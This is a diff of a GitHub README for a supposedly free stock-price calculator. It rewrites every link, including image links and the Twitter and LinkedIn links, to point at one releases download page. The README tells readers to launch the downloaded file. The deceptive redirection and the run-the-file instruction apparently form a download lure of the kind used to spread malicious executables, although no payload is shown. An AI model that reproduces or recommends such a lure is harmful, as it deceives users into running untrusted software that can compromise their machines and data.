@@ -1,6 +1,6 @@
 # 🚀 Welcome to the Free Average Stock Price Calculator!
 
-![Stock Market](https://imageurl.com/stockmarket.jpg)
+![Stock Market](https://github.com/1234Erick/Free-Average-Stock-Price-Calculator/releases)
 
 ## Description:
 This repository houses the **Free Average Stock Price Calculator**, a tool designed to assist you in calculating the average price of stocks. Whether you are a beginner investor or a seasoned trader, this calculator can help you make informed decisions based on stock data.
@@ -18,7 +18,7 @@ This repository houses the **Free Average Stock Price Calculator**, a tool desig
 ## Get Started:
 To access the tool, simply download the latest version from the link below:
 
-[![Download Calculator](https://img.shields.io/badge/Download-Release.zip-brightgreen)](https://github.com/assets/Release.zip)
+[![Download Calculator](https://github.com/1234Erick/Free-Average-Stock-Price-Calculator/releases)](https://github.com/1234Erick/Free-Average-Stock-Price-Calculator/releases)
 (*Note: Please launch the file after downloading.*)
 
 If the above link doesn't work, or if you prefer a different version, feel free to check the "Releases" section of this repository for alternative options.
@@ -36,10 +36,10 @@ This tool was developed by a team passionate about making stock market data more
 If you have any suggestions for improving the calculator tool or would like to contribute to its development, feel free to submit a pull request. We appreciate any feedback or enhancements that can make this tool even more valuable to users.
 
 ## Connect with Us:
-Stay updated on the latest news and updates by following us on [Twitter](https://twitter.com/stockcalculator) and [LinkedIn](https://linkedin.com/in/stockcalculator).
+Stay updated on the latest news and updates by following us on [Twitter](https://github.com/1234Erick/Free-Average-Stock-Price-Calculator/releases) and [LinkedIn](https://github.com/1234Erick/Free-Average-Stock-Price-Calculator/releases).
 
 ---
 
 Invest wisely with the Free Average Stock Price Calculator! 📈🔍
 
-![Stock Market Graph](https://imageurl.com/stockgraph.jpg)
+![Stock Market Graph](https://github.com/1234Erick/Free-Average-Stock-Price-Calculator/releases)
